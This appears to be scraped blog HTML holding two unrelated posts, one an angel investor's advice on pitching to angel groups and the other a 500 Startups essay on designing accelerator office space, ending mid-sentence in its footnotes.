      "content" : "<p>As Angel investors, we like to see entrepreneurs with a laser-like focus on themselves, their venture, and fundraising. However, there are times when that single-mindedness can work to their disadvantage. With startups, fundraising is usually the most formidable challenge, whether the money comes from Angels, VCs, or other sources. Over the years I’ve seen many entrepreneurs make the process even more challenging by not putting themselves inside the head of an Angel and not looking at the situation from the investor’s vantage point. In order to do this, it’s important to <code></code>understand some of the key traits of Angels:</p>\n<p><em>Angels want and need returns</em><br>\nAlthough Angels invest their own personal funds and often have altruistic motives, they can’t continue investing without returns. Many entrepreneurs dismiss this idea and figure that if an Angel isn’t beholden to an outside institutional investor the way a VC is, then returns aren’t a high priority. Having been both an Angel and VC, and although both scenarios are pretty uncomfortable, I can tell you it’s a lot worse explaining a bad personal investment to your spouse, than explaining one gone awry to your fund’s Limited Partner.</p>\n<p>Along with focusing on returns, Angels typically shy away from sectors of past failure. On numerous occasions I’ve been approached by entrepreneurs asking if we’d fund their company in a particular sector, right after closing down a similar company. Please do your homework (see below) before pitching, and in particular do some research on our portfolio companies—particularly noting where we’ve had successes and failures. The good entrepreneurs passionately believe they have lightening in a bottle and that their company is different. However, if your company’s in a market where we’ve had bad experiences, then the Angel you’re talking to will be subconsciously thinking about the prospect of your crashing and burning.</p>\n<p><em>Angels are often accomplished individuals, but…</em><br>\nIn pitches to the Pasadena Angels, we’ve had hundreds of entrepreneurs assume that because our group is comprised of very bright people that went to the top Universities, then our members must be very technically oriented. A lot of the recent press about Google, PayPal, or (you fill in the blank) developers becoming Angels and throwing checks around like Johnny Appleseed hasn’t helped matters. Although we do have a few of those technical types in the group, the vast majority are not overly technical, and will lose patience and interest fast if your pitch contains a lot of technical jargon and acronyms. Some of the best pitches we’ve seen have been from entrepreneurs that have taken a very complex technology and/or target market and described it in very simple language in 1-2 slides.</p>\n<p><em>Angels can have short attention spans</em><br>\nIf I only had 24 hours to live, I’d want to spend it with Mr./Ms. Entrepreneur, since it would feel like an eternity. This pretty much sums up what many Angels think when listening to a long, boring pitch. Most of the time, the problem stems from the entrepreneur not being succinct and their inability to get their point across in as few words as possible. If you look at the backgrounds of many of our members, these are individuals that have previously had hundreds (and sometimes thousands) or people working for them and tend to be bottom-line oriented. Think about how well a long-winded pitch would resonate with a CEO or senior executive from a Fortune 500 company, which is where many of these people have come from.  The net impression produced here is that if you can’t easily explain your business to us, how will you ever explain it to a customer or key partner. Lastly, if an investor asks “aren’t you like Google, Microsoft, etc.” or another relevant question, don’t be dismissive, as their attention span will get even shorter.</p>\n<p>Some of the other pitch pitfalls that will invariably decrease Angel attention spans are story telling (e.g., talking for 30 minutes on the history of the Internet) and stating the obvious. When I fist joined the Pasadena Angles in 2004, one of the pitches I heard was for a company that had developed a dashboard mounted mapping and traffic monitoring device. For most of the 40 minute presentation, the Founder did nothing but try to convince us that Los Angeles had a traffic problem (really?). Although this individual was a visionary, clearly saw where the market was going, and had a good product prior to Garmin and TomTom, the company never got funded and eventually closed.</p>\n<p><em>Angels run in packs</em><br>\nCultivate a champion early within the Angel group, or better still cultivate champions.  Although Angel groups have become institutionalized, these organizations are people, and not firms, and it is the individual member that makes each investment. Who you initially contact within an Angel group really matters. Let’s say there are two members in the group that might be potentially interested in your company—one who has 20 years of experience in your target market, and another that has no knowledge of your sector.  Within an Angel group we all typically look for a member that has relevant sector experience to either get us excited about a company or tell us we should pass. And if you contact the wrong member, you may be starting with one foot already out the door. For fundraising, you really need to think through who you reach out to for that first conversation. To make that process easier, the Pasadena Angels has provided for many years on our website the <a href=\"http://pasadenaangels.com/?option=com_content&amp;task=view&amp;id=33\">bios of our members</a>.</p>\n<p><em>Angels like to co-invest with the smart money</em><br>\nWho you’ve had involved with the Company (e.g., investors, board members, advisors, etc.) is really important when seeking Angel investors.  Having a prominent name and people that are well respected by Angels can be helpful with fundraising. Angels (and most VC) like to be involved with those they perceive to be the ‘smart money.’  For our investments it always comes down to people, and most importantly the founding team and those that do the day-to-day work. However, to Angels it also matters who’s behind the company, what they are willing to do in order to support the company, and most importantly how they are perceived.</p>\n<p><em>It’s show time, folks</em><br>\nIn the movie All That Jazz, Joe Gideon (Roy Scheider) looks in the mirror and utters “It’s show time, folks”, which is a good way to think about (minus the pill popping) going into a pitch with Angels.  As is the case with most people, Angels respond emotionally as well as to reason, and it’s critical to show both high energy and enthusiasm.  As I mentioned a couple of years ago when I was on the Frank Peters show, you have the initial two minutes of a pitch to get maximum impact with prospective investors. If you exhibit the personality of <a href=\"http://www.youtube.com/watch?v=NP0mQeLWCCo\">Ben Stein</a> (think Ferris Bueller and not his regular NY Times columns), that’s not likely to happen.</p>\n<p><a href=\"http://www.youtube.com/watch?v=f5URCGyMINg\"><img src=\"http://img.youtube.com/vi/f5URCGyMINg/default.jpg\" width=\"130\" height=\"97\" border=\"0\"></a></p>"

My personal evidence over the last three years is  based on experiences learning and teaching classes at the <a href=\"http://dschool.stanford.edu\">Stanford  dschool</a> and helping design other “accelerators” like Facebook’s <a href=\"http://fbfund.com\">fbFund  REV</a> and <a href=\"http://venrock.com\">Venrock</a>‘s Quarry. I’m writing this as we build our first  iteration of 10k sq ft in downtown Mountain View and actively test how  entrepreneurs respond to spaces with the help of many  collaborators.[<a href=\"http://500.co/#shoutouts\">shoutouts</a>] Please share feedback,  especially case studies, hacks and data from entrepreneurs like Dave  Schappell’s <a href=\"http://500.co/2010/10/11/how-to-sustainably-make-the-startup-office-more-livable/\">post</a>!</em></p>\n<p><a href=\"http://blog.500startups.com/wp-content/uploads/2010/12/giraffe-nest.jpg\"><img title=\"Startup Giraffe Nest\" src=\"http://blog.500startups.com/wp-content/uploads/2010/12/giraffe-nest.jpg\" alt=\"\" width=\"304\" height=\"320\"></a></p>\n<p>One of the most basic human needs for startups is space- both  physical and increasingly digital spaces too. As companies evolve, it’s  natural to look for “office space” and carve out a location to flourish  in clusters like Silicon Valley. <strong>But why is space important to  accelerating the probability of early stage startup success</strong>?</p>\n<p>Long story short if you don’t read much: space matters because it can  set the optimal context for resource-based variables to 1) <strong>accelerate  the collision between great ideas and people</strong> 2) <strong>influence company  productivity, community &amp; learning</strong> 3) <strong>form a platform with network  effects</strong>.</p>\n<p>Space design is just one instantiation of my focus on spreading design thinking-doing at 500 Startups.[<a href=\"http://500.co/#design\">design</a>]  Watch this ~1 min video to get a sense of our space design process and  don’t get your hopes up too much – we building our space on a lean,  early stage startup-centered budget to look unfinished and reinforce our  culture of prototyping while preserving flexibility for iteration – not  for Architectural Digest.</p>\n<p><iframe src=\"http://reader.googleusercontent.com/reader/embediframe?src=http://www.youtube.com/v/3tsbISFI6-s?fs%3D1%26hl%3Den_US%26rel%3D0&amp;width=560&amp;height=340\" width=\"560\" height=\"340\"></iframe></p>\n<p>Now for those whose who want to read further…<br>\nTo start off, I’m beginning to make a case about why space matters in  setting the optimal context for early stage startup acceleration.  Success outcomes for an early stage startup participating in an  accelerator can mean <strong>raising more funding</strong>, <strong>hiring key talent</strong>, and <strong>finding product-market-fit</strong>.[<a href=\"http://500.co/#successoutcomes\">accelerator success outcomes</a>] Each outcome has associated market driven performance metrics that we are tracking to compare with other accelerator-likes.</p>\n<p>There are many factors influencing these success outcomes for early  stage startups and it’s hard to tell which ones really make a  difference in the long run.[<a href=\"http://500.co/#success\">success</a>] Accelerator, incubator, coworking, and other hybrid models are bubbling  up all over the world to support entrepreneurs by manipulating a  combination of <strong>resource-based variables such as funding, the  accelerator-like team, mentorship, services, education, tools, sponsors, events and space</strong>.[<a href=\"http://500.co/#resourcebasedvariables\">resource-based variables</a>] Think of these as external value multipliers. I’ll be continuously  sharing experiences and experimental evidence about each of these  resources to ‘prove’ they’re positively correlated with success outcomes via company proxy variables like <strong>productivity, community and learning</strong>.[<a href=\"http://500.co/#proxyvariables\">company proxy variables</a>] Think of these as internal outcomes for each company during the  acceleration time period. Hopefully we can develop models for experimenting with these variables together and ultimately help build  better companies more efficiently to solve important, meaningful  problems, so again, please share your results!</p>\n<p><a href=\"http://blog.500startups.com/wp-content/uploads/2010/12/variables-and-outcomes4.007.007.jpg\"><img title=\"500 Startups Accelerator Variables and Outcomes\" src=\"http://blog.500startups.com/wp-content/uploads/2010/12/variables-and-outcomes4.007.007.jpg\" alt=\"\" width=\"1024\" height=\"768\"></a></p>\n<p>Productivity, as an example proxy variable or antecedent to success outcomes, simply represents your ability and motivation to “get shit  done” in the space that actually makes an impact. In other words, productivity is “<strong>the efficiency of achieving validated learning, measured by actionable metrics and speed through Build-Measure-Learn  loops</strong>.”[<a href=\"http://www.startuplessonslearned.com/\">Eric Ries</a>] Depending on acceleration time frame, often around 3  months, think about how many closed deals, life  long connections, and MVP experiments etc. you can make in an incubator space (while avoiding  too much distraction) versus if you’re just on your own hacking in a  coffee shop? Spaces therefore should be designed with the intention of improving variables like productivity to “fuel the creative process by  encouraging — or discouraging — specific behaviors.” [<a href=\"http://www.fastcompany.com/magazine/146/the-idea-lab.html\">Scott Witthoft</a>]  This line of reasoning may seem obvious because it is. But what’s lacking is clear intention and consciousness behind startup space design and the myth that if you build a great coworking building the rest will magically come together. Most spaces are architected without the point of view of startup entrepreneurs and their specific needs at the early stage. As an example, Eric Ries pushed me to draft hypotheses (albeit with lurking variables and weak conditionality) about how space affects productivity. I’ll be looking to falsify these in future posts and I encourage you to as well.</p>\n<p><a href=\"http://blog.500startups.com/wp-content/uploads/2010/12/500-Startups_-Space-Productivity-Hypotheses.042.jpg\"><img title=\"500 Startups Space Productivity Hypotheses\" src=\"http://blog.500startups.com/wp-content/uploads/2010/12/500-Startups_-Space-Productivity-Hypotheses.042.jpg\" alt=\"\" width=\"1024\" height=\"768\"></a></p>\n<p>Below are a few points to consider about how space connects resource-based and company proxy variables together to increase the probability of accelerator success outcomes.</p>\n<h2><strong>1. Innovation originates in spaces that accelerate the collision between great ideas and people.</strong></h2>\n<p>Although you may think of the solitary genius, or lone hacker toiling in  his garage, go back in history and look at coffee shops like the Grand  Cafe that helped spur the Enlightenment or Parisian salons at the  forefront of modernism. Innovation occurs  simultaneously not just from profit motives: it comes from creating  environments where ideas can connect. Startup accelerators provide a  space where ideas can mingle, swap, and create new forms- the basis for  creative breakthroughs.[<a href=\"http://www.ted.com/talks/steven_johnson_where_good_ideas_come_from.html\">Steven Johnson</a>] With enough colocated brilliant entrepreneurs  from different backgrounds hungry for change, you’re bound to stumble  serendipitously across amazing new info to build upon, increasing the  probability of aha moments and “idea sex.” Fundamentally, you want your  team forming new networks of neurons firing in synch and need to put  them in environments where these new networks are more likely to form.  In this sense, space is kind of like glial cells. Without going too much  farther in the weeds, if you really wanted to measure this seemingly  intangible benefit, just start counting all the great productive ideas and relationships  that form in an accelerator space versus when you’re on your own.</p>\n<p><iframe src=\"http://reader.googleusercontent.com/reader/embediframe?src=http://www.youtube.com/v/NugRZGDbPFU?fs%3D1%26hl%3Den_US%26rel%3D0&amp;width=560&amp;height=340\" width=\"560\" height=\"340\"></iframe></p>\n<p>Furthermore, when you’re at the early-stages still validating a lot of  assumptions and prototyping your path to product-market-fit along the  perimeter of technological options, you want  to solve problems in unique and special ways FAST. A true hacker finds  the process of problem solving exciting and interesting, but needs time  to look at the problem in multiple ways. <strong>So why not put be in  proximity to other hackers, mentors, and service providers who can  potentially accelerate the development of many more great ideas for  solutions?</strong> Not to mention these trustworthy folks who work near you for  weeks are more likely going to be able to find and attract the right  hire you need unlike some recruiter who annoys people and really doesn’t  understand your vision.[<a href=\"http://500.co/#diversity\">diversity</a>]</p>\n<p>Similarly, entrepreneurs need a place to show off their work to raise  capital and investors need to visit the best spaces for discovery. As an  entrepreneur, if you’re trying to raise additional rounds of funding, you need intros, tips about investors with the highest probability of  transferring you money, and a community that has your back to say the  least. Obviously there’s nuances to fundraising depending on the stage,  but for seed, bridge rounds in between, and Series A, there’s no better  place to collide with potential investors than in the right accelerator  spaces. The amount of top angels and VCs I’ve seen in our space in just a  couple weeks is easily 10x greater than what you’d get in your own  place. For example, if an investor comes in and I think you should meet  them, we’ll drop by your desk and say hello which is much more efficient  than endless email. Don’t worry we won’t let investors creep around uninvited and it’s not a zero sum game, there’s  enough money to go around if you’re truly doing something innovative,  it’s more a problem of startup-investor fit. The community of other 500  Startups entrepreneurs and mentors are great people to help solve that  because combined they know nearly everyone in the Valley and will help  you get the best deal… <strong>Accelerator spaces (even without events like  dinners and demo days) create opportunities for entrepreneurs and  investors to meet that would otherwise not happen</strong>. Like I said before,  we got to start measuring the impact. I wager that the amount of  investor leads and deals you close that originated from participating in  an accelerator is greater than what you would get on your own on  average.</p>\n<p>So, don’t think of great ideas and people as self-contained things in  your own company closet because they’re more like ecologies and  networks.[<a href=\"http://www.wired.com/magazine/2010/09/mf_kellyjohnson/all/1\">Kevin Kelly</a>] Especially in the early stage when you’re trying to figure  out your path, put yourself in spaces where resources collide with your  company in positive ways and lead to more successful outcomes.</p>\n<h2><strong>2. Intentional accelerator space design can influence productivity, community &amp; learning.</strong></h2>\n<p>Space matters because “creativity follows context.”[<a href=\"http://www.fastcompany.com/magazine/146/the-idea-lab.html\">George Kimbel</a>] If you want to influence the behavior of startups in a certain way, you  obviously need to design for that. For example, do you notice that  feedback and energy in a meeting can be affected by something seemingly  trivial like the type of chair, sofa, stool etc? I bet  you’ll engage differently with an entrepreneur while reclining in seat  across a fancy board room table versus sitting actively on a bench in  front of a white board.</p>\n<p><strong>But what does it mean to set the right context to get all those great  ideas and people to collide? </strong>That still sounds a bit too fuzzy. Below are  few concepts to consider as you think of context as an interaction  problem.</p>\n<p><em>Location</em>: Simply put, where are the behaviors you care about occurring? From a  macro-level, it can start with the city you’re in. Although many of my  friends and startups are setting up in San Francisco (I’m from the Bay Area) and it’s a great  city especially if you’re young, hip and looking to meet new people, it  may not be the best location for your first few months as an early stage startup in  Silicon Valley. During an acceleration period, the most important thing is productivity. I’m not saying to stay up all night, not sleep or  socialize but to have intense focus on validating that your company  should exist and be around other people who are striving for similar  goals. The kind of pressure I want from our space is to hack  productively, creatively and radically collaborate while developing deep  relationships and having healthy fun- not constant temptation to go out  and spend the little money I have around people that don’t understand  startup life. Don’t take my word for it, just  ask other early stage entrepreneurs who live in San Francisco who work  nearly seven days a week and barely take advantage of the social aspects  of SF while they live in an expensive tiny place that get’s no sun. We  picked our first home in downtown Mountain View because it’s proximity  to a community: VCs, major platforms like  Google/Facebook/Apple/Microsoft, Stanford University, blocks of cheap  food-coffee-tea options, access to public transportation, and affordable  living options. Long story short, <strong>we want to be closest to the  epicenter of funding, top talent, partners for distribution, and cheaper  necessities to help you get traction</strong>. The location of our 500 Startups  community “is interlaced with the larger community in which it is  located.” [<a href=\"http://en.wikipedia.org/wiki/A_Pattern_Language\">Christopher Alexander</a>] From a micro-level, within our space, there’s a ton of things to  consider about the location of certain elements but I’ll save that for  another post specifically about space layout.</p>\n<p><em>Activity</em>: Context fundamentally arises from activity.[<a href=\"http://portal.acm.org/citation.cfm?id=970985\">Paul Dourish</a>] There are different types of activities associated with common work scenarios we call “i-time”, “little-we”, and “big-we”? As a result, our space design should facilitate  these scenarios or at least not get in the way. i-time, aka individual, heads down, “get shit done” mode is one of the  most challenging things to design for given so much individual  variability and the difference between makers and managers in early  stage startups.[<a href=\"http://www.paulgraham.com/makersschedule.html\">Paul Graham</a>] i-time to work on serious problems and really think  clearly is increasingly under threat with all the buzzes, beeps, and  task switching that may be making us “dumber” so to speak.[<a href=\"http://gigaom.com/2010/09/27/multi-tasking-is-bad-this-video-could-change-your-work-life/\">Clifford Nass</a>]  Theoretically cubicles and private offices solve for i-time until people  start to kill themselves, fight over hierarchy and compromise  face-to-face time. Well designed accelerators on the other hand can  enable your team members to bounce out to a variety of private spaces  like focus “monk” rooms where they can jam for a given period of time  and shelters they can customize so people don’t feel confined to only  one place. Try it out yourself and give people control to manipulate  personal space, just like software, and if enough people do something they’re  asking for a change.</p>\n<p><a href=\"http://blog.500startups.com/wp-content/uploads/2010/12/500-Startups-Work-Scenarios.019.jpg\"><img title=\"500 Startups Work Scenarios\" src=\"http://blog.500startups.com/wp-content/uploads/2010/12/500-Startups-Work-Scenarios.019.jpg\" alt=\"\" width=\"1024\" height=\"768\"></a></p>\n<p>As you observe people behave, think of re-occurring work dimensions or  patterns that we often bounce around to and from including: <strong>intense  focus to procrastination, private to public, formal to informal, quiet  to loud, in-the-machine to out-of-the-machine</strong>. There’s a lot more to  discuss here but I’m trying to avoid writing you a novel because people  barely read more than 140 characters. Again to drive home the connection  between a resource-based variable like space and a company proxy  variable like productivity, I’ll talk briefly about the designing spaces  to foster a range of intense focus to procrastination.</p>\n<p><a href=\"http://blog.500startups.com/wp-content/uploads/2010/12/500-Startups-Work-Scenario-Dimension.021.jpg\"><img title=\"500S Work Scenario Dimension Intense Focus to Procrastination\" src=\"http://blog.500startups.com/wp-content/uploads/2010/12/500-Startups-Work-Scenario-Dimension.021.jpg\" alt=\"\" width=\"1024\" height=\"768\"></a></p>\n<p><a href=\"http://blog.500startups.com/wp-content/uploads/2010/12/500-Startups-Work-Scenario-Dimension.025.jpg\"><img title=\"500S Work Scenario Dimension Formal to Informal\" src=\"http://blog.500startups.com/wp-content/uploads/2010/12/500-Startups-Work-Scenario-Dimension.025.jpg\" alt=\"\" width=\"1024\" height=\"768\"></a></p>\n<p><a href=\"http://blog.500startups.com/wp-content/uploads/2010/12/500-Startups-Work-Scenario-Dimension.027.jpg\"><img title=\"500S Work Scenario Dimension Quiet to Loud\" src=\"http://blog.500startups.com/wp-content/uploads/2010/12/500-Startups-Work-Scenario-Dimension.027.jpg\" alt=\"\" width=\"1024\" height=\"768\"></a></p>\n<p><a href=\"http://blog.500startups.com/wp-content/uploads/2010/12/500-Startups-Work-Scenario-Dimension.029.jpg\"><img title=\"500S Work Scenario Dimension In-the-Machine to Out-of-the-Machine\" src=\"http://blog.500startups.com/wp-content/uploads/2010/12/500-Startups-Work-Scenario-Dimension.029.jpg\" alt=\"\" width=\"1024\" height=\"768\"></a></p>\n<p>“<strong>You probably only have to interrupt someone a couple times a day before  they’re unable to work on hard problems at all</strong>.”[<a href=\"http://www.paulgraham.com/procrastination.html\">Paul Graham</a>] I  take this to heart as a designer because I often need around a four hour  chunk of time to really become immersed and produce high quality work  but I’m constantly getting pulled in multiple directions by requests,  emails, notifications, meetings and more. It’s essential that  accelerator teams are mindful of the risk of too many distractions from  visitors, events etc. (or recognize that entrepreneurs are just making  excuses) and work with the community to set norms about behavior in  certain spaces. In our case, the East side work area for i-time is  nearest the elevator where the most traffic comes from. So not only do  we need to use doors, carpeting, and signage to drive people towards the  cafe area where little-we and big-we activities go on, we must  reinforce the norm by having an orientation when new companies join the  accelerator, providing noise cancelers and encouraging people to call  each other out if someone is becoming too disruptive. This is just one  of many issues to consider, so please share how you design space for  different work scenarios and dimensions.</p>\n<p><em>Visual Awareness</em>: tuning into what’s happening around you, processing  info through peripheral channels to keep up on-going knowledge of  others’ locations, activities etc is natural. Think of scanning when  someone walks through the door or noticing a new tweet in the  background. Benefits of high awareness include improved coordination,  rapid info sharing, increased observational &amp; tacit learning but  there’s costs like the loss of privacy, distractions, interruptions  &amp; noise. [<a href=\"http://www.gsa.gov/portal/content/103982\">GSA</a>] <strong>Accelerator space can magnify potential awareness of  important learnings that you would otherwise miss when you work alone</strong> (eg breakthrough progress from other teams, startup trends, educational  events, mentor office hours) by giving you visual clues into how  successful teams work, ambient displays of inspirational information,  and designated zones for visitor interaction.<br>\nAs an experimental anecdote, during construction we moved temporarily to  the 9th floor which was designed with all private rooms that had just  enough room to house a startup. I noticed immediately that people went  for the “best” rooms based on views, sunlight, access to exits etc. and  started “nesting” and closing their doors. As expected there’s a startup  tendency to get their “own” space and privacy with four walls so  they can begin developing their own culture. While this was a good thing  because people were able to “get shit done”, the space layout of the  9th floor significantly hurt community activities because their was  little visual awareness of everyone else. To my surprise when we moved  back to the 12th floor, companies started introducing themselves,  meaning that after nearly a month of working in the same space, they  still didn’t know each other! So as a take home lesson, find a balance  between giving companies privacy and props as well as exposing them to  each other so they can collide. “<strong>Workplaces must not be too scattered,  nor too agglomerated, but clustered in groups of about 15…Group in  strongly identifiable communities. The communities need to be small  enough so that one can know most of the people working in them, at least  by sight- and big enough to support amenities</strong>.” [<a href=\"http://en.wikipedia.org/wiki/A_Pattern_Language\">Christopher Alexander</a>]</p>\n<p>Another space tip to consider is making artifacts visible in shared  spaces to promote learning. <a href=\"http://www.stonetronix.com/\">Stone Librande</a>, Creative Director of  startup-like teams at EA, gives a great a lecture on how he begins  designing games by making paper prototypes and board games to work out  the mechanics. He places them in common areas where people are provoked  to interact with them everyday, stimulating new associations- the  neurological basis for creativity. [<a href=\"http://www.ncbi.nlm.nih.gov/pubmed/14972752\">KM Heilman et al</a>] Similarly, in  the Stanford dschool we practice a method of space saturation, where  you unpack thoughts and experiences into tangible and visual pieces of  information that you surround yourself with to inform and inspire  designs. You do this in a shared space where everyone can see the same  mental model, again to increase the probability of “aha” links and  reduce all coordination costs of digital communication and confusion we  encounter laying screens on top of screens. “<strong>As you walk along, you can  see what others are up to, and perhaps contribute an idea to somebody  else’s project</strong>.” [<a href=\"http://www.fastcompany.com/magazine/146/the-idea-lab.html\">Scott Doorley</a>]. Furthermore,  there’s research that shows these sorts of behaviors in “war rooms” can  actually double people’s productivity. [<a href=\"http://www.sciencedaily.com/releases/2000/12/001206144705.htm\">S Teasley et al</a>] No  wonder both Twitter and Facebook had short-term war room spaces for  teams working on latest new releases. Long story short visual cues in  accelerator spaces should move you towards interactions that promote the success outcomes you want  to achieve.</p>\n<p><em>Availability</em>: what, how and when you want to interact with others.  Availability is tricky because it’s a continuous process of negotiating  what you want to be aware of and how visible you want to be to others at  a given time. Common behaviors you see in startup work spaces are  people closing their door, putting on headphones, pulling down blinds  for i-time. But what I’m advocating for is having even more intention  about how space signals availability and associated behaviors from the  structural to furniture level.</p>\n<p>For example, we believe that little-we and big-we spaces are often where  community connections get formed. We intentionally blew out walls and  created a large non-persistent, multi-use area directly connected to our  cafe for visitors, folks like our resident mentors, and events. The  furniture in this space is even more flexible, reconfigurable and meant  to signal that you’re more available to talk than at your workstation.  “The system allows a modal shift between intimate and open.” [<a href=\"http://www.fastcompany.com/magazine/146/the-idea-lab.html\">Scott Doorley</a>] Think about where people naturally gather and walk, like animals around a  water hole, and leverage these patterns to foster more serendipitous  interactions. Find ways to get people talking during transitions in  public spaces, the optimal context for casual interactions versus  unexpected interruptions near work stations. Entrepreneurs often act so  busy they don’t have time for anything when in reality they sometimes  should be making time to get outside of their insular bubble- so design  spaces where that more naturally can occur. Our North side is “the  common piece of land within the work community, which ties the  individual workshops and [companies] together.” [<a href=\"http://en.wikipedia.org/wiki/A_Pattern_Language\">Christopher Alexander</a>]<br>\n<strong> </strong></p>\n<h2><strong>3. Spaces form a platform with network effects</strong></h2>\n<p>After a few acceleration batches, our space will be a platform for startups to grow like a two-sided market connecting talented entrepreneurs with an ecosystems of investors, partners and more… For the time being, it starts with eating our own dog food and getting through as many build-measure-learn cycles in our space. We’re combining lean startup and  human centered design methodologies to show that space brings together  resource-based variables that influence company specific proxy variables  and ultimately accelerator success outcomes.</p>\n<p><a href=\"http://blog.500startups.com/wp-content/uploads/2010/12/500-Startups-Work-Scenario-Dimension.033.jpg\"><img title=\"500 Startups Work Scenario Dimension.033\" src=\"http://blog.500startups.com/wp-content/uploads/2010/12/500-Startups-Work-Scenario-Dimension.033.jpg\" alt=\"\" width=\"1024\" height=\"768\"></a></p>\n<p>In closing be mindful and aware of your space, find empathy with the humans you care about, make some hypotheses about what really matters, build prototypes, test them, and measure the results to extract learnings, then rinse-repeat like you would with software. Although the brutalist structure at 444  Castro St may represent an artifact of  the “spiritual, intellectual,  and moral deformity” of previous Internet bubble implosions [<a href=\"http://www.mv-voice.com/story.php?story_id=4750\">Dog City</a>],  our intention is to reclaim the space with the networked resources and  positive energy needed for entrepreneurs to tackle meaningful problems  in more efficient and creative ways.</p>\n<p><strong>Footnotes:</strong><br>\n[<a name=\"shoutouts\"><strong>Shoutouts</strong></a>]:<br>\n<a href=\"http://dschool.stanford.edu/people/team_scott_doorley.php\">Scott Doorley</a>, <a href=\"http://dschool.stanford.edu/people/team_scott_witthoft.php\">Scott Witthoft</a>, &amp; <a href=\"http://twitter.com/michalkopec\">Michal Kopec</a> (<a href=\"http://dschool.stanford.edu\">Stanford d.school</a> Environments Collaborative)<br>\nJim Merryman (Facebook)<br>\nPrimo Orphilla, Denise Cherry, &amp; Kroeun Dav (<a href=\"http://www.o-plus-a.com/\">Studio O + A</a>)<br>\nSteven Gerten, Tamara Larson, &amp; David Meckley (<a href=\"http://huntsmanag.com/\">Huntsman</a>)<br>\nAmit Wadhwa (AWA)<br>\nEd Howard (Steelcase)<br>\nMike Drez (OneWorkplace)<br>\nTina Lee &amp; Dave Denny (InsideSource)<br>\nRob Englert &amp; Grant Meacham (<a href=\"http://d-build.org/\">D-Build</a>)<br>\nJosh Alfaro, Volpentest, Travis Lee &amp; Danny Chavez any many more (Novo Construction)<br>\nDeborah Boyer, Maria Damato-Jay, Patrick Flynn, Marianella Guandique &amp; more (Swigco)<br>\nRod Scherba &amp; Sam Warburg (CC &amp; Carey)<br>\nMarc Pacaldo, Matt Stoltz, Orion Lakota &amp; Luke Dillman (143 Garage Team)<br>\n<a href=\"http://shuqiao.tumblr.com/\">Shuqiao Song</a> &amp; Carey Lee (Stanford dschool)<br>\nTim Pacaldo, &amp; <a href=\"http://lisacarroll.org/\">Lisa Carroll</a></p>\n<p>[<a name=\"design\"><strong>Design</strong></a>] can be  everything- a big realization for any designer. My biases stem from  Stanford University sources of human-computer-interaction, persuasive  technology, and product design. From my viewpoint, design is a holistic,  re-combinatorial, human-centered process that can reliably produce  innovative solutions to nearly any challenge. I envision design thinking  to be the glue that binds our startups together in our space. From a  more practical perspective, we integrate lean startup and UX design  methodologies that are actionable to entrepreneurs on a tight budget  with a need for speed.</p>\n<p>[<a name=\"successoutcomes\"><strong>Accelerator Success Outcomes</strong></a>]<br>\n<em>More Funding</em>: You can fundraise more effectively by joining an  accelerator that draws the attention of investors to one place versus  spending months knocking on VCs doors.<br>\n<em>Hiring Key Talent</em>: Attract a <a href=\"http://www.paulgraham.com/gba.html\">hacker</a> culture with brilliant people and/or be around other awesome folks in a space who inspire and motivate you.<br>\n<em>Finding product-market-fit</em>: “When a product shows strong demand by  passionate users representing a sizable market.” Basically at the end of  an acceleration period can you prove: 1) The customer is willing to pay  for the product. 2) The cost of acquiring the customer is less than  what they pay for the product. 3) There’s sufficient evidence indicating  the market is large enough to support the business. See the <a href=\"http://www.custdev.com/\">Entrepreneur’s Guide to Customer Development</a> and <a href=\"http://www.startuplessonslearned.com/\">Startup Lessons Learned</a>. We’re lucky to have the thought leader sources of the lean startup movement as mentors, advisors and investors.</p>\n<p>[<a name=\"success\"><strong>Success</strong></a>] is highly subjective but is directly tied to a startup’s ability to create <a href=\"http://www.paulgraham.com/wealth.html\">wealth</a>. It’s important to note that while achieving Google gorilla status as a  sustainable publicly traded company is home run level success that many entrepreneurs and investors aspire to but there are inter-mediate success outcomes specific to early stage startups and their purpose for  participating in accelerator-like models.</p>\n<p>[<a name=\"proxyvariables\"><strong>Company Proxy Variables</strong></a>]<br>\n<em>Productivity</em>: your ability and motivation to “get shit done” in the space that actually makes an impact. In other words, productivity is “the efficiency of achieving validated learning, measured by actionable metrics and speed through Build-Measure-Learn loops.”[<a href=\"http://www.startuplessonslearned.com/\">Eric Ries</a>]<br>\n<em>Community</em>: I’ll save in-depth discussions of community for another post. Basically, does a company participating in an accelerator space find meaningful belonging and dare I say, real friends, collaborators, and other tribesmen who go out of there way to help without always an expectation of immediate return.<br>\n<em>Learning</em>: This is part of productivity, however, there are other potential learnings around design, data, and distribution that may be super valuable but not directly incorporated into your product eg you learn how to avoid common entrepreneur pitfalls or things like useful SEO hacks without applying them during the acceleration period. I think learning is one of the key differentiators that accelerator/incubators of past failed to realize. Why spend ~$200k+ on business school if you’re trying to become an entrepreneur? Go get seed funding from an accelerator and learn by doing.</p>\n<p>[<a name=\"resourcebasedvariables\"><strong>Resource-based Variables</strong></a>]<br>\n<em>Funding</em>: Some companies participating in early stage accelerators are still closing their first seed round, some are looking  for a bridge and others are getting ready for series A or even B.<br>\n<em>The accelerator-like team</em>: Ignore all this unnecessary PR about “super’  angels and what not. The reality is Silicon Valley is a bit like Hollywood, where there are stars that attract the best talent and a supporting cast to make it happen. Dave McClure is an up and coming star consistently listed among the best and we have a well rounded team to support your needs.<br>\n<em>Mentorship</em>: There are many models for structuring relationships between early stage entrepreneurs and those who’ve been around the block. In order to scale we’ve intentionally recruited over a 100  mentors with operational background that can help you execute and avoid dumb mistakes. Look out for improved mechanisms for facilitating startup-mentor relationships.<br>\n<em>Services</em>: This can mean a wide variety of things like legal, finance, admin back office, IT support etc. that  accelerator/incubators traditionally provided to remove friction from starting a business and relieve founders of distractions like errands. While it’s important that entrepreneurs know how to start a business from scratch and not make legal blunders, our focus is on services that augment design, data, and distribution. Personally I’m leading, and most excited about the development of scalable design resources for our early stage startups.<br>\n<em>Education</em>: This can be everything from ad-hoc meetups to lectures and even formalized curriculum. At fbFund REV, we over-delivered on this and setup so much content that people couldn’t even consume. Although we’ll tone down the amount of education at 500S, I think the most important outcomes from educational resources is inspiring and reinforcing learnings around replicable design processes and a shared vernacular that companies can use to better communicate.<br>\n<em> Tools</em>: Anything from the calendering software that Paul Graham wrote to infrastructure platforms like Twilio that other 500S  companies can use to be more productive. There’s a TON of innovation here without creating too much of an echoing chamber.<br>\n<em> Sponsors</em>: I’m looking for sponsors who can hook us up with super useful things like screens, furniture, healthy food, equipment, hosting and more. We have deals we’ll soon be announcing that are geared to make lives of startups better.<br>\n<em>Events</em>: They can be related to the variables above or more social in nature meant 